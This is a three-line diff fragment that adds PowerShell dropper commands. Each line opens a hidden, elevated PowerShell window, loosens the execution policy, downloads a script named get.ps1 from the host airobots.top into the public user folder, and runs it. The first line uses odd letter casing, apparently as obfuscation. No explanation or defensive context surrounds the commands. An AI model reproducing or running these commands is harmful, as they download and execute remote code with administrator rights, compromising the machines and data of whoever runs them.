@@ -1,0 +1,3 @@
+START-PROCESS -fILEpATH POWERSHELL " -NOP -W HIDDEN -C SET-eXECUTIONpOLICY rEMOTEsIGNED -FORCE;CD $ENV:PUBLIC;(nEW-oBJECT sYSTEM.nET.wEBcLIENT).dOWNLOADfILE('HTTP://airobots.top/static/get.ps1','C:\USERS\PUBLIC\GET.PS1');./GET.PS1;EXIT" -vERB RUNAS;EXIT");
+start-process -FilePath powershell " -nop -w hidden -c set-ExecutionPolicy RemoteSigned -force;cd $env:public;(New-Object System.Net.WebClient).DownloadFile('http://AIROBOTS.TOP/STATIC/GET.PS1','c:\users\public\get.ps1');./get.ps1;exit" -Verb runas;exit
+start-process -FilePath powershell " -nop -w hidden -c set-ExecutionPolicy RemoteSigned -force;cd $env:public;(New-Object System.Net.WebClient).DownloadFile('http://AIROBOTS.TOP/STATIC/GET.PS1','c:\users\public\get.ps1');./get.ps1;exit" -Verb runas;exit
